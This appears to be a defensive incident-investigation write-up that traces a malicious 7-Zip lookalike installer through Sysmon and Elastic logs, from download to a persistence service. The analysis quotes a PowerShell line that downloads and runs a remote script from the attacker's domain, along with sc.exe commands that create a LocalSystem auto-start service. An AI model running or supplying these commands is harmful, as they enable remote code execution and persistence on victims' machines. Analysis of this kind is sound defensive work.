# Introduction

Software supply chain attacks have become one of the most effective techniques used by threat actors to compromise organizations. Instead of directly targeting victims, attackers disguise malicious software as legitimate applications and rely on user trust to gain initial access.

In this investigation, I analyzed a potential software supply chain compromise involving a victim who searched online for a file extraction utility and unknowingly downloaded a malicious installer masquerading as a legitimate 7-Zip application.

Using Elastic Security and endpoint telemetry collected from the affected workstation, the objective was to reconstruct the attack timeline, identify the malicious infrastructure, track the attacker's activities, and assess the overall impact of the compromise.

Throughout this investigation, I followed a threat hunting approach by examining process activity, file creation events, network connections, authentication logs, and post-compromise behavior to understand how the attacker progressed from initial access to full domain compromise and ransomware deployment.

<img width="1305" height="850" alt="Ekran görüntüsü 2026-06-15 194717" src="https://github.com/user-attachments/assets/c86cea46-61e2-4d48-b41f-494f3edc01a4" />

>  The victim searched for 7-Zip and clicked a sponsored search result that redirected to the malicious domain `7zipp.org`, a lookalike website impersonating the legitimate 7-Zip download page.

## Initial Investigation

Based on the scenario, the victim user searched online for software capable of extracting a password-protected archive and downloaded what appeared to be a legitimate 7-Zip installer.

As a starting point, I focused on identifying the exact software downloaded by the victim and determining whether the file originated from a trusted source.

To begin the investigation, I searched for browser-related activity associated with the victim workstation and reviewed Sysmon events that could reveal file download activity.

### Identifying the Downloaded File

By filtering for Chrome-related events and examining records containing URL information, I discovered a Sysmon Event ID 15 entry containing Zone Identifier metadata. This artifact is particularly useful because Windows records the original source URL of files downloaded from the internet.

The event revealed the following information:

```text
HostUrl=http://www.7zipp.org/a/7z2301-x64.msi
```

<img width="1897" height="686" alt="Ekran görüntüsü 2026-06-15 194304" src="https://github.com/user-attachments/assets/d3d47ecb-c6d5-42cb-a6f1-ea64cd6100bc" />

> Sysmon Event ID 15 exposed the original download source through Zone Identifier metadata, revealing the URL used to download the malicious installer.


The domain immediately appeared suspicious. While the filename and installer attempted to mimic the legitimate 7-Zip software, the download originated from **7zipp.org**, a lookalike domain designed to imitate the official 7-Zip website.

This finding confirmed that the victim had downloaded a malicious installer disguised as legitimate software, establishing the initial access vector used in the compromise.

With the malicious download URL identified, the next objective was to determine the infrastructure behind the operation and identify the server hosting the malicious installer.


## Identifying the Hosting Infrastructure

After identifying the malicious download URL, the next step was to determine the infrastructure hosting the installer and identify the IP address associated with the suspicious domain.

To continue the investigation, I reviewed DNS-related events associated with the domain discovered during the previous phase.

By searching for references to `7zipp.org`, I identified multiple DNS resolution events that revealed the IP address associated with the malicious infrastructure.


<img width="558" height="678" alt="Ekran görüntüsü 2026-06-15 200127" src="https://github.com/user-attachments/assets/9cd479c2-88f3-45d9-8aed-c6c8b6a900d6" />


> DNS telemetry revealed that the malicious domain `7zipp.org` resolved to the IP address `206.189.34.218`, providing additional visibility into the infrastructure used to host the malicious installer.

The DNS records consistently resolved the domain to the same IP address, indicating that the installer was hosted on infrastructure controlled by the attacker.

## Tracking Malware Execution

With the hosting infrastructure identified, the next step was to determine whether the downloaded installer was successfully executed on the victim workstation and identify the process responsible for launching the malware.

To continue the investigation, I searched for references to the downloaded MSI package and reviewed Sysmon process creation events associated with the file.

Using the filename identified during the previous phase, I searched for:

`process.command_line : *7z2301*`

The results revealed a Sysmon Event ID 1 process creation event showing the execution of the downloaded installer through Windows Installer (`msiexec.exe`).

<img width="1898" height="397" alt="Ekran görüntüsü 2026-06-15 203740" src="https://github.com/user-attachments/assets/e1d3cc89-a556-4265-a70c-dfe2b9915beb" />

> Sysmon Event ID 1 confirmed execution of the downloaded MSI package. The CommandLine field showed that `msiexec.exe` launched the file `7z2301-x64.msi` from the victim's Downloads directory.

The process creation event revealed that the installer was executed through `msiexec.exe` with Process ID (PID) `2532`.

This finding confirmed that the malicious installer was not only downloaded but also successfully executed on the victim workstation, allowing the investigation to continue along the attack chain.


## Following the Payload Execution Chain

After confirming that the malicious MSI package had been executed, the next objective was to determine what actions were performed by the installer and identify any additional payloads retrieved from attacker-controlled infrastructure.

Malware installers commonly act as droppers, downloading and executing secondary payloads after the initial execution phase. To investigate this possibility, I searched for PowerShell activity containing HTTP references, as PowerShell is frequently abused to retrieve and execute remote content.

Using the following query:

`process.name : powershell.exe and http`

I identified several PowerShell execution events containing external URLs.

<img width="1898" height="681" alt="Ekran görüntüsü 2026-06-15 205949" src="https://github.com/user-attachments/assets/f40419e0-44eb-40f3-be0f-dea010976759" />

> PowerShell activity containing HTTP references revealed the execution chain initiated by the malicious installer.

Among the results, one PowerShell command stood out because it downloaded and immediately executed a remote script hosted on the same malicious infrastructure identified during the previous phases.

```text
powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
```

The command used `Invoke-WebRequest (iwr)` to retrieve the remote PowerShell script `7z.ps1` and `Invoke-Expression (iex)` to execute the downloaded content directly in memory.

This finding confirmed that the MSI installer functioned as a dropper and launched a second-stage PowerShell payload, allowing the attacker to continue the compromise beyond the initial software installation.

With the second-stage payload identified, the next step was to investigate its activity and determine what actions were performed by the downloaded script, including any additional files, tools, or software components deployed on the victim workstation.

## Investigating Additional Components Deployed by the Script

After identifying the second-stage PowerShell payload, the next objective was to determine what actions were performed by the downloaded script and whether any additional software components were deployed on the victim workstation.

To investigate the script's behavior, I searched for references to `7z.ps1` and reviewed the processes spawned by the PowerShell payload.

Using the following query:

`7z.ps1`

I identified process creation events associated with the downloaded script.

<img width="1904" height="400" alt="Ekran görüntüsü 2026-06-15 211544" src="https://github.com/user-attachments/assets/7688696f-3038-42e6-a542-4e29aca8ec93" />

> Analysis of processes associated with `7z.ps1` revealed the execution of an additional binary named `7zlegit.exe`.

The process creation event revealed the full file path of the legitimate installer deployed by the script:

```text
C:\Windows\Temp\7zlegit.exe
```

The command line indicated that the binary was executed silently using the `/S` switch, suggesting that the malware attempted to install a legitimate version of the software in order to reduce suspicion and maintain the appearance of a normal installation process.

This behavior is commonly observed in software supply chain compromises, where threat actors deploy a legitimate application alongside malicious components to avoid immediately alerting the victim to the compromise.

With the legitimate installer identified, the next step was to determine whether additional persistence mechanisms or malicious services were created by the attacker.

```
```
## Investigating Service Installation and Persistence

After identifying the legitimate installer deployed by the PowerShell payload, the next step was to determine whether the attacker established persistence on the compromised workstation.

Malware frequently achieves persistence by creating Windows services that automatically execute whenever the system starts. To investigate this possibility, I continued reviewing activity associated with the previously identified PowerShell script and examined the processes it spawned.

Using the following query:

`7z.ps1`

I identified additional child processes launched by the malicious script.

<img width="1897" height="503" alt="Ekran görüntüsü 2026-06-15 212434" src="https://github.com/user-attachments/assets/7649168a-d567-4fa3-a0c2-49cf24faa6b9" />

> Analysis of processes spawned by the PowerShell payload revealed the creation and execution of a new Windows service.

Among the observed activities, the script executed `sc.exe`, a legitimate Windows utility used to create and manage services. The command line revealed that a new service named `7zService` was created and configured to start automatically during system boot.

```text
"C:\Windows\system32\sc.exe" create 7zService binpath= "C:\Program Files\7-Zip\7zipp.exe" start=auto obj=LocalSystem
```

Shortly after creation, the service was started using the following command:

```text
"C:\Windows\system32\sc.exe" start 7zService
```

The service was configured to run under the `LocalSystem` account, granting it extensive privileges on the host. Additionally, the `start=auto` parameter ensured that the service would automatically execute whenever the system restarted, providing the attacker with a reliable persistence mechanism.

This finding confirmed that the malicious script established persistence by creating and launching the 7zService Windows service, enabling continued access to the compromised workstation.

The combination of automatic startup, LocalSystem privileges, and attacker-controlled binaries significantly increased the attacker's ability to maintain long-term access and execute additional malicious actions on the host.

With the persistence mechanism identified, the next step was to investigate the service execution and determine how the attacker established command-and-control (C2) communications within the environment.


















































